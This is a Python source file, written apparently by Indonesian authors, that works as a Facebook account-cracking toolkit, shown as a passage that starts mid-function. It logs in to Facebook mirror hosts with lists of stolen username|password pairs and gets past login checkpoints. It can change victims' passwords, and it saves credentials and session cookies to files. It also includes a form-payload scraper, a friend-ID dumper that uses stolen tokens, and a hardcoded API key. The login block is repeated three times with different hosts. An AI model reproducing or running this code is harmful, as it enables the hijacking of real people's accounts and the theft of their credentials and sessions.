	print("\n[+]%s \033[0mSelesai mengecek akun"%(O));jeda(0.07)
	input('[+]%s [%s Enter%s ] '%(O,U,O))
	back()
	
data = {}
data2 = {}

def mengecek(user,pw):
	global loop,ubah_pass,pwbaru
	session=requests.Session()
	ua = random.choice(ugen7)
	#ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36'
	url = "https://mbasic.prod.facebook.com"
	session.headers.update({"Host": "mbasic.beta.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.prod.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.prod.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post(url+link.get("action"),data=data)
	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r%s%s\033[0m akun terkunci sesi new"%(M,til))
		else:
			print("\r%s%s\033[0m akun tidak checkpoint, silahkan anda login "%(til,H))
			open('OK/OK-%s.txt'%(waktu), 'a').write(" %s|%s\n" % (user,pw))
	elif "checkpoint" in session.cookies.get_dict():
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=bs4.BeautifulSoup(an.text,"html.parser")
		cek=[cek.text for cek in response2.find_all("option")]
		number=0
		prints(nel(f'{P2}Terdapat {H2}{str(len(cek))} {P2}opsi{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					dat,dat2={},{}
					but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
					for x in response("input"):
						if x.get("name") in but:
							dat.update({x.get("name"):x.get("value")})
					ubahPw=session.post(url+link2.get("action"),data=dat).text
					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
					link3=resUbah.find("form",{"method":"post"})
					but2=["submit[Next]","nh","fb_dtsg","jazoest"]
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						for b in resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						tree = Tree(" ")
						tree.add(f"\r[green]{user}|{pwbaru[0]}[white] ").add(f"\r[green]{UserAgentAaepitgans_Xc()}[white] ")
						tree.add(f"\r[green]{coki}[white] ")
						Buat(tree)
						open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s|%s\n" % (H,user,pwbaru[0],coki))
						cek_apk(coki)
				else:
					print("\r%s%s \033[0makun one tab, silahkan anda login		"%(H,til))
					open('OK/OK-%s.txt' %(waktu), 'a').write("%s %s|%s|%s\n" % (H,user,pw,coki))
					cek_apk(coki)
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r%s╰─\033[0m akun terpasang autentikasi dua faktor			"%(M))
			else:
				print("%s%s\033[0mterjadi kesalahan"%(M,til))
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r%s%s akun tidak checkpoint, silahkan anda login "%(H))
				open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s\n" % (H,user,pw))
		for opsi in range(len(cek)):
			number +=1
			jalan ("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s╰─ %s"%(M,oh))
	else:
		print("%s╰─ \033[0mlogin gagal, silahkan cek kembali id dan kata sandi"%(M))
		
		
#------[TAP YES V2]------#
import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from threading import (Thread, Event)
from time import sleep as jeda
from datetime import datetime

ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month

waktu = ("%s-%s-%s"%(hari,bulan,tahun))
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
J = '\033[38;2;255;127;0;1m' # ORANGE
N = '\x1b[0m' # WARNA MATI
acak = [M, H, K, B, U, O, P, J]
warna = random.choice(acak)
til ="\033[0m╰─ "

def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)
		
		
ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []

def filecek_cp():
	dirs = os.listdir('CP')
	prints(nel(f'{P2}Tools Facebook Checker Account checkpoint V¹\nPeringatan :{M2} Jangan terlalu sering pakai kasih delay minimal 10/5 menit lah Terimakasih.{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	for file in dirs:
		print("➛ \033[0m%s"%(file));jeda(0.07)
	try:
		prints(nel(f'{P2}[+] Masukan file [ cth{M2}: {K2}CP-%s.txt{P2} ]'%(waktu),width=70,padding=(0,7),style=f"{color_panel}")) 
		cekopsi()
	except IOError:
		print ('%s[+]\033[0mfile tidak ada'%(M))
		exit()

def cekopsi():
	CP = ("CP/")
	romi = input("[+]%s \033[0mNama file %s> %s"%(O,M,K))
	if romi == "":
		print("[+]%s \033[0misi yang benar "%(M));jeda(2)
		cekopsi()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit("\n[+]%s \033[0mnama file %s\033[0m tidak tersedia"%(M,romi))
	jalan("\033[0m[+]%s\033[0m Mode pesawatkan terlebih dahulu 5 detik "%(O))
	pw=input("\n[+]%s \033[0mubah sandi pada akun one tab? y/t %s> %s"%(O,M,K))
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2 = input("\033[0m[+]%s \033[0mmasukan sandi %s> %s"%(O,M,K))
		if len(pw2) <= 5:
			print("[+] %ssandi minimal 6 karakter "%(M))
		else:
			pwbaru.append(pw2)
	prints(nel(f'{P2}Total akun : {H2}{str(len(file_cp))}{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split("|")
		nomor+=1
		print("\n%s%s.%s \033[0mlogin akun %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
		try:
			mengecek(ngecek[0].replace("",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			continue
	print("\n[+]%s \033[0mSelesai mengecek akun"%(O));jeda(0.07)
	input('[+]%s [%s Enter%s ] '%(O,U,O))
	back()
	
data = {}
data2 = {}

def mengecek(user,pw):
	global loop,ubah_pass,pwbaru
	session=requests.Session()
	ua = random.choice(ugen7)
	#ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36'
	url = "https://mbasic.beta.facebook.com"
	session.headers.update({"Host": "mbasic.beta.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.beta.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.beta.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post(url+link.get("action"),data=data)
	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r%s%s\033[0m akun terkunci sesi new"%(M,til))
		else:
			print("\r%s%s\033[0m akun tidak checkpoint, silahkan anda login "%(til,H))
			open('OK/OK-%s.txt'%(waktu), 'a').write(" %s|%s\n" % (user,pw))
	elif "checkpoint" in session.cookies.get_dict():
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=bs4.BeautifulSoup(an.text,"html.parser")
		cek=[cek.text for cek in response2.find_all("option")]
		number=0
		prints(nel(f'{P2}Terdapat {H2}{str(len(cek))} {P2}opsi{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					dat,dat2={},{}
					but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
					for x in response("input"):
						if x.get("name") in but:
							dat.update({x.get("name"):x.get("value")})
					ubahPw=session.post(url+link2.get("action"),data=dat).text
					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
					link3=resUbah.find("form",{"method":"post"})
					but2=["submit[Next]","nh","fb_dtsg","jazoest"]
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						for b in resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						tree = Tree(" ")
						tree.add(f"\r[green]{user}|{pwbaru[0]}[white] ").add(f"\r[green]{UserAgentAaepitgans_Xc()}[white] ")
						tree.add(f"\r[green]{coki}[white] ")
						Buat(tree)
						open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s|%s\n" % (H,user,pwbaru[0],coki))
						cek_apk(coki)
				else:
					print("\r%s%s \033[0makun one tab, silahkan anda login		"%(H,til))
					open('OK/OK-%s.txt' %(waktu), 'a').write("%s %s|%s|%s\n" % (H,user,pw,coki))
					cek_apk(coki)
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r%s╰─\033[0m akun terpasang autentikasi dua faktor			"%(M))
			else:
				print("%s%s\033[0mterjadi kesalahan"%(M,til))
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r%s%s akun tidak checkpoint, silahkan anda login "%(H))
				open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s\n" % (H,user,pw))
		for opsi in range(len(cek)):
			number +=1
			jalan ("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s╰─ %s"%(M,oh))
	else:
		print("%s╰─ \033[0mlogin gagal, silahkan cek kembali id dan kata sandi"%(M))
		
		
#------[TAP YES V3]------#
import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from threading import (Thread, Event)
from time import sleep as jeda
from datetime import datetime

ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month

waktu = ("%s-%s-%s"%(hari,bulan,tahun))
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
J = '\033[38;2;255;127;0;1m' # ORANGE
N = '\x1b[0m' # WARNA MATI
acak = [M, H, K, B, U, O, P, J]
warna = random.choice(acak)
til ="\033[0m╰─ "

def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)
		
		
ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []

def filecek4_cp():
	dirs = os.listdir('CP')
	prints(nel(f'{P2}Tools Facebook Checker Account checkpoint V¹\nPeringatan :{M2} Jangan terlalu sering pakai kasih delay minimal 10/5 menit lah Terimakasih.{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	for file in dirs:
		print("➛ \033[0m%s"%(file));jeda(0.07)
	try:
		prints(nel(f'{P2}[+] Masukan file [ cth{M2}: {K2}CP-%s.txt{P2} ]'%(waktu),width=70,padding=(0,7),style=f"{color_panel}")) 
		cekopsi()
	except IOError:
		print ('%s[+]\033[0mfile tidak ada'%(M))
		exit()

def cekopsi():
	CP = ("CP/")
	romi = input("[+]%s \033[0mNama file %s> %s"%(O,M,K))
	if romi == "":
		print("[+]%s \033[0misi yang benar "%(M));jeda(2)
		cekopsi()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit("\n[+]%s \033[0mnama file %s\033[0m tidak tersedia"%(M,romi))
	jalan("\033[0m[+]%s\033[0m Mode pesawatkan terlebih dahulu 5 detik "%(O))
	pw=input("\n[+]%s \033[0mubah sandi pada akun one tab? y/t %s> %s"%(O,M,K))
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2 = input("\033[0m[+]%s \033[0mmasukan sandi %s> %s"%(O,M,K))
		if len(pw2) <= 5:
			print("[+] %ssandi minimal 6 karakter "%(M))
		else:
			pwbaru.append(pw2)
	prints(nel(f'{P2}Total akun : {H2}{str(len(file_cp))}{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split("|")
		nomor+=1
		print("\n%s%s.%s \033[0mlogin akun %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
		try:
			mengecek(ngecek[0].replace("",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			continue
	print("\n[+]%s \033[0mSelesai mengecek akun"%(O));jeda(0.07)
	input('[+]%s [%s Enter%s ] '%(O,U,O))
	back()
	
data = {}
data2 = {}

def mengecek(user,pw):
	global loop,ubah_pass,pwbaru
	session=requests.Session()
	ua = random.choice(ugen7)
	#ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36'
	url = "https://mbasic.trunkstable.facebook.com"
	session.headers.update({"Host": "mbasic.trunkstable.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.trunkstable.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.trunkstable.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post(url+link.get("action"),data=data)
	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r%s%s\033[0m akun terkunci sesi new"%(M,til))
		else:
			print("\r%s%s\033[0m akun tidak checkpoint, silahkan anda login "%(til,H))
			open('OK/OK-%s.txt'%(waktu), 'a').write(" %s|%s\n" % (user,pw))
	elif "checkpoint" in session.cookies.get_dict():
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=bs4.BeautifulSoup(an.text,"html.parser")
		cek=[cek.text for cek in response2.find_all("option")]
		number=0
		prints(nel(f'{P2}Terdapat {H2}{str(len(cek))} {P2}opsi{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					dat,dat2={},{}
					but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
					for x in response("input"):
						if x.get("name") in but:
							dat.update({x.get("name"):x.get("value")})
					ubahPw=session.post(url+link2.get("action"),data=dat).text
					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
					link3=resUbah.find("form",{"method":"post"})
					but2=["submit[Next]","nh","fb_dtsg","jazoest"]
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						for b in resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						tree = Tree(" ")
						tree.add(f"\r[green]{user}|{pwbaru[0]}[white] ").add(f"\r[green]{UserAgentAaepitgans_Xc()}[white] ")
						tree.add(f"\r[green]{coki}[white] ")
						Buat(tree)
						open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s|%s\n" % (H,user,pwbaru[0],coki))
						cek_apk(coki)
				else:
					print("\r%s%s \033[0makun one tab, silahkan anda login		"%(H,til))
					open('OK/OK-%s.txt' %(waktu), 'a').write("%s %s|%s|%s\n" % (H,user,pw,coki))
					cek_apk(coki)
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r%s╰─\033[0m akun terpasang autentikasi dua faktor			"%(M))
			else:
				print("%s%s\033[0mterjadi kesalahan"%(M,til))
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r%s%s akun tidak checkpoint, silahkan anda login "%(H))
				open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s\n" % (H,user,pw))
		for opsi in range(len(cek)):
			number +=1
			jalan ("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s╰─ %s"%(M,oh))
	else:
		print("%s╰─ \033[0mlogin gagal, silahkan cek kembali id dan kata sandi"%(M))
		  
def scarpping_ua():
    # Url & Headers website #
    
    
    url = "https://api.apilayer.com/user_agent/generate?android=true&chrome=true"
    header = {"apikey": "2ZxXnjQByF6rPu3GM5DtcEmrJfKqB5xL"}
    
    # Main menu #
    
  #  os.system('clear')
    try:
        response = requests.get(url,headers=header)
        if response.status_code == 200:
            uascrap.append(response.json()['ua'])
        else:
            uascrap.append("Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36")
    except requests.exceptions.ConnectionError:
        uascrap.append("Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36")
        


###----------[ AUTHOR ]---------- ###

# --> Modules
import requests,bs4,sys,os,datetime,re
from bs4 import BeautifulSoup as bs
from datetime import datetime
from itertools import count 
from requests import get 
from bs4 import BeautifulSoup 
from rich import print as cetak
from rich import print as prints
from rich.panel import Panel as nel
done = False 
results = [] 
# -->  Clear Terminal
def clear():
    if "linux" in sys.platform.lower():os.system("clear")
    elif "win" in sys.platform.lower():os.system("cls")

# --> Waktu
def start():
    global Mulai_Jalan
    Mulai_Jalan = datetime.now()
def akhir():
    global Akhir_Jalan, Total_Waktu
    Akhir_Jalan = datetime.now()
    Total_Waktu = Akhir_Jalan - Mulai_Jalan
    try:
        Menit = str(Total_Waktu).split(':')[1]
        Detik = str(Total_Waktu).split(':')[2].replace('.',',').split(',')[0] + ',' + str(Total_Waktu).split(':')[2].replace('.',',').split(',')[1][:1]
        prints(nel(f'{P2}Program Selesai Dalam Waktu %s Menit %s Detik{P2}'%(Menit,Detik),width=70,padding=(0,7),style=f"{color_panel}")) 
    except Exception as e:
    	prints(nel(f'{P2}Program Selesai Dalam Waktu 0 Detik{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 

# --> Main Program
class get_data_web:
    
    def __init__(self):
        self.xyz = requests.Session()
        url = input('[+] Url Anda : ')
        prints(nel(f'{P2}[{color_text}1{P2}]. Source Payload\n[{color_text}2{P2}]. Parsed Payload\n[{color_text}3{P2}]. Source Code Post Requests{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
        self.tanya = input('[+] Pilih : ')
        self.domain = url.split('/')[2]
        self.get_form(url)

    def get_form(self,url):
        req = self.xyz.get(url)
        raq = bs(req.content,'html.parser')
        for x in raq.find_all('form'):
            if self.tanya in ['1','01','a']: self.printing1(req,x)
            elif self.tanya in ['2','02','b']: self.printing2(req,x)
            elif self.tanya in ['3','03','c']: self.printing3(url,req,x)
            else: exit('\nIsi  Yg Benar!')

    def get_head1(self,req):
        data = {}
        head = req.headers
        usls = ['cookie','set-cookie','report-to','expires','x-fb-debug','date','last-modified','etag']
        for x,y in zip(head.keys(),head.values()):
            try:
                if x.lower() in usls: continue
                else: data.update({x:y})
            except Exception as e:continue
        return(data)

    def get_data1(self,form):
        data = {}
        for y in form.find_all('input'):
            try:data.update({y['name']:y['value']})
            except Exception as e:continue
        return(data)

    def get_data2(self,form):
        data = []
        for y in form.find_all('input'):
            try:data.append(y)
            except Exception as e:continue
        return(data)

    def get_post1(self,form):
        z = form['action']
        if 'https://'+self.domain in z: return(z)
        elif 'http://'+self.domain in z: return(z)
        else: return('https://%s%s'%(self.domain,z))

    def printing1(self,req,x):
        head = self.get_head1(req)
        data = self.get_data1(x)
        post = self.get_post1(x)
        coki = self.xyz.cookies.get_dict()
        prints(nel(f'{P2}Souce Payload{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
        print('[Host] %s'%(self.domain))
        print('[Head] %s'%(head))
        print('[Data] %s'%(data))
        print('[Coki] %s'%(coki))
        print('[Post] %s'%(post))

    def printing2(self,req,x):
        head = self.get_head1(req)
        data = self.get_data2(x)
        post = self.get_post1(x)
        coki = self.xyz.cookies.get_dict()
        prints(nel(f'{P2}Parsed Payload{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
        # --> Tampil Headers
        print('head = {')
        for x,y in zip(head.keys(),head.values()):
            print('    %s%s: %s'%(x,' '*(29-len(x)),y))
        print('    }')
        # --> Tampil Data
        print('data = {')
        for x in data:
            try:
                if 'value' in str(x):
                    dp = 'name=' + re.search('name=(.*?)/>',str(x)).group(1)
                    fp = re.search('value="(.*?)"',str(dp)).group(1)
                    print("    %s%s: '%s',"%(x['name'],' '*(19-len(x['name'])),fp))
                elif 'name' in str(x):
                    print("    %s%s: '',"%(x['name'],' '*(19-len(x['name']))))
                else: continue
            except Exception as e: continue
        print('    }')
        # --> Tampil Cookie
        print('cookie = {')
        for x,y in zip(coki.keys(),coki.values()):
            print('    %s%s: %s'%(x,' '*(5-len(x)),y))
        print('    }')
        # --> Post Requests
        print("next = '%s'"%(post))
        print("post = requests.Session().post(next,headers=head,data=data,cookies=cookie)")
    def printing3(self,url,req,x):
        head = self.get_head1(req)
        data = self.get_data2(x)
        post = self.get_post1(x)
        prints(nel(f'{P2}Souce Code Post Request{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
        # --> Tampil Get Requests
        print("url  = '%s'"%(url))
        print("requ = bs(requests.Session().get(url).content,'html.parser')")
        # --> Tampil Headers
        print('head = {')
        for x,y in zip(head.keys(),head.values()):
            print('    %s%s: %s'%(x,' '*(29-len(x)),y))
        print('    }')
        # --> Tampil Data
        print('data = {')
        for x in data:
            try:
                if 'value' in str(x):
                    dp = 'name=' + re.search('name=(.*?)/>',str(x)).group(1)
                    fp = re.search('value="(.*?)"',str(dp)).group(1)
                    gp = dp.replace(fp,'(.*?)')
                    rs = ("re.search('%s',str(requ)).group(1)"%(gp))
                    print('    %s%s: %s,'%(x['name'],' '*(19-len(x['name'])),rs))
                elif 'name' in str(x):
                    print("    %s%s: '',"%(x['name'],' '*(19-len(x['name']))))
                else: continue
            except Exception as e: continue
        print('    }')
        # --> Tampil Cookie
        print("cookie = requests.Session().cookies.get_dict()")
        # --> Post Requests
        print("next = '%s'"%(post))
        print("post = requests.Session().post(next,headers=head,data=data,cookies=cookie)")

#----------[BUAT DUMP ID SAMA]----------#
import os, re, requests, random, json, time, sys
from time import sleep

class Asepitgans_xXc:
	def __init__(self):
		self.id = []
		self.loop = 0
		try:
			self.cookie = open(".cok.txt","r").read()
			self.token = open(".token.txt","r").read()
			try:
				url = requests.get("https://graph.facebook.com/me?fields=id,name&access_token="+self.token,cookies={"cookie":self.cookie})
				nm_ = json.loads(url.text)["name"]
				id_ = json.loads(url.text)["id"]
				self.menu(id_,nm_,)
			except KeyError:
				Asepitgans_Xc()
			except requests.exceptions.ConnectionError:
				prints(nel(f'{P2}Koneksi jaringan tidak stabil{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
		except FileNotFoundError:
			Asepitgans_Xc()
	def menu(self, idku, nmku):
		prints(nel(f'{P2} Hallo welcome {H2}{nmku}{P2} monyet{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		teks = f'''[•] Masukan id : '''
		user = input(teks)
		try:
			header = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"}
			req = requests.get("https://graph.facebook.com/v15.0/"+user+"?fields=friends.limit(5000){id,name}&access_token="+self.token,cookies={"cookie": self.cookie},headers=header).json()
			for res in req['friends']['data']:
				try:self.id.append(res['id'])
				except:continue
			self.tanya()
		except (KeyError,IOError):
			prints(nel(f'{P2}ID anda sepertinya tidak publik{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
	def tanya(self):
		prints(nel(f'''{P2}[{color_text}1{P2}]. 10001      [{color_text}6{P2}]. 10006
[{color_text}2{P2}]. 10002      [{color_text}7{P2}]. 10007
[{color_text}3{P2}]. 10003      [{color_text}8{P2}]. 10008
[{color_text}4{P2}]. 10004      [{color_text}9{P2}]. 10009
[{color_text}5{P2}]. 10005      [{color_text}0{P2}]. 10000{P2}''',width=70,padding=(0,7),style=f"{color_panel}")) 
		pilih = input('[•] Pilih : ')
		if pilih =='1':self.dump_lagi('1')
		if pilih =='2':self.dump_lagi('2')
		if pilih =='3':self.dump_lagi('3')
		if pilih =='4':self.dump_lagi('4')
		if pilih =='5':self.dump_lagi('5')
		if pilih =='6':self.dump_lagi('6')
		if pilih =='7':self.dump_lagi('7')
		if pilih =='8':self.dump_lagi('8')
		if pilih =='9':self.dump_lagi('9')
		if pilih =='0':self.dump_lagi('0')
	def dump_lagi(self,target):
